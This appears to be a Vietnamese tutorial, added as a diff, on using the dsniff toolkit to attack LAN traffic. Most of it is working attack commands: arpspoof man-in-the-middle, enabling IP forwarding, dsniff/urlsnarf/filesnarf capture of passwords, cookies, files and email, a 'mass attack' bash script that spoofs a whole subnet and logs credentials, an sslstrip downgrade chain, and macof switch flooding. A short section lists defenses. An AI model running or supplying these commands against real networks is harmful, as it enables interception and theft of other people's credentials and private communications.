@@ -1,0 +1,143 @@
+1. dsniff là gì?
+
+    dsniff là bộ công cụ classic cực nhẹ, mạnh cho sniffing và MITM mạng LAN, bao gồm nhiều tool:
+
+        dsniff (main): Tự động sniff, extract password, credential, session trên mọi giao thức text (HTTP, FTP, SMTP, IMAP, POP3, Telnet, SNMP, X11, NFS, SMB, Rlogin, Oracle…)
+
+        arpspoof: Giả mạo ARP để tạo MITM
+
+        macof: Flood bảng ARP của switch (bypass port security, pivot)
+
+        webmitm/webspy: MITM & sniff traffic web, theo dõi session
+
+        filesnarf/mailsnarf/urlsnarf/msgsnarf: Auto extract file, email, URL, message từ traffic
+
+2. Cài đặt dsniff
+A. Ubuntu/Kali/Debian
+
+sudo apt update
+sudo apt install dsniff
+
+    Các lệnh cài đặt gồm: dsniff, arpspoof, filesnarf, mailsnarf, urlsnarf, macof, webmitm, webspy, msgsnarf
+
+3. Thực chiến sniff password, session với dsniff
+A. Đặt card ở chế độ promisc và MITM
+
+    Chạy ARP spoof (giả mạo giữa victim và gateway):
+
+sudo arpspoof -i eth0 -t <victim_IP> <gateway_IP>
+sudo arpspoof -i eth0 -t <gateway_IP> <victim_IP>
+
+Bật IP forwarding trên attacker:
+
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+(Hoặc dùng ettercap/bettercap để MITM toàn mạng)
+
+Sniff password:
+
+    sudo dsniff -i eth0
+
+        dsniff sẽ tự động extract password, credential, session cho mọi giao thức hỗ trợ.
+
+B. Sniff HTTP password:
+
+sudo dsniff -i eth0 -f "tcp port 80"
+
+    Kết quả: Tất cả username, password, cookie gửi qua HTTP, FTP, IMAP, Telnet, SMTP, v.v. đều hiện rõ trong terminal.
+
+4. Extract file, email, URL, message – các tool trong dsniff
+Tool	Chức năng thực tế
+filesnarf	Tự động extract file gửi qua NFS/SMB
+mailsnarf	Lấy email gửi/nhận qua SMTP/POP3/IMAP
+urlsnarf	Extract mọi URL HTTP/HTTPS truy cập bởi user
+msgsnarf	Ghi lại message (IRC, Jabber, chat app)
+webspy	Hiện real-time mọi web victim truy cập (đặt IP victim)
+webmitm	MITM HTTPS, tự động generate cert (giả), log traffic
+
+Ví dụ dùng urlsnarf:
+
+sudo urlsnarf -i eth0
+
+Ví dụ dùng filesnarf:
+
+    sudo filesnarf -i eth0 -w /tmp/extracted_files/
+
+5. Automation/script hóa mass attack với dsniff
+
+    Script MITM toàn mạng, extract password, log toàn bộ traffic:
+
+    #!/bin/bash
+    iface=eth0
+    gateway=192.168.1.1
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+    sudo arpspoof -i $iface -t $gateway <broadcast> &
+    sudo dsniff -i $iface > /tmp/dsniff.log
+
+    Kết hợp với tcpdump/wireshark để capture traffic, sau đó parse bằng dsniff, urlsnarf, filesnarf, v.v.
+
+6. Sniff HTTPS/SSL traffic nâng cao
+
+    Dsniff không decode HTTPS (trừ khi dùng webmitm/webspy với cert giả, hoặc kết hợp sslstrip để downgrade về HTTP).
+
+    Chain attack:
+
+        MITM + sslstrip (downgrade HTTPS → HTTP) → dsniff extract password!
+
+        Kết hợp với ettercap/bettercap, inject mã độc, phishing.
+
+7. Pivot, bypass switch security với macof
+
+    macof: Flood ARP/MAC table của switch, ép switch về chế độ hub (broadcast) → sniff mọi traffic nội bộ.
+
+    sudo macof -i eth0
+
+    Dùng để pivot trên mạng doanh nghiệp hoặc lab không bảo mật tốt.
+
+8. Forensic, blue team – monitor, phát hiện và phòng chống
+
+    Passive sniff: Dùng dsniff để log credential, session rò rỉ trên mạng, training/forensic.
+
+    Phòng chống:
+
+        Dùng HTTPS/HSTS mọi nơi (dsniff không sniff được payload đã mã hóa)
+
+        Bật VPN, encrypted protocol
+
+        Switch port security, dynamic ARP inspection
+
+        IDS/IPS cảnh báo ARP spoof, bất thường MAC
+
+        Dùng Wireshark/tcpdump để monitor, phát hiện MITM
+
+9. Fix lỗi thực tế
+Lỗi	Fix
+Không sniff được password	Chỉ thấy traffic đã mã hóa (HTTPS), app dùng encryption, test HTTP/legacy app
+Không MITM được	Chạy sudo/root, bật IP forwarding, chọn đúng interface, victim trên cùng subnet
+Không extract được file/email	Chọn đúng tool (filesnarf, mailsnarf), test đúng giao thức
+Không sniff được trên switch	Switch dùng port isolation, cần thử macof để flood hoặc pivot khác
+Tool báo lỗi libpcap/permission	Chạy bằng sudo, update dsniff, check version libpcap
+10. So sánh dsniff với các tool khác
+Tool	Ưu điểm dsniff	Khác biệt
+dsniff	Nhẹ, siêu nhanh, script tốt, tự extract mọi credential, session, file, message	Không inject, không decode HTTPS, không filter mạnh như ettercap/bettercap
+ettercap	MITM đa năng, GUI/TUI, filter/inject code, fake DNS	Automation mạnh hơn, injection/phishing tốt hơn
+bettercap	MITM all-in-one, WiFi/BLE/IoT, automation, API	Nặng hơn, script mạnh, sniff đa giao thức, fake DNS/ARP
+mitmproxy	MITM HTTP(S), script Python, sửa traffic	Không auto extract mọi credential như dsniff
+Wireshark	Phân tích sâu, forensic, decode protocol	Không auto extract password, không MITM
+11. Tài liệu, link hữu ích
+
+    dsniff manpage
+
+    dsniff Github (unofficial)
+
+    PayloadAllTheThings – Network Sniffing
+
+    Hacktricks – Network Sniffing
+
+    Bettercap, Ettercap
+
+Tóm tắt nhanh
+
+    dsniff: bộ công cụ sniff mạng classic mạnh nhất – sniff password/credential/session trên mọi giao thức text, extract file, email, URL, message, MITM nhanh với arpspoof/macof, script hóa automation, kết hợp sslstrip/ettercap/bettercap để tấn công và forensic trên mạng LAN/lab/CTF.
+
+    Rất hợp để training, demo, forensic, CTF, pentest network nội bộ legacy/chưa mã hóa chuẩn.
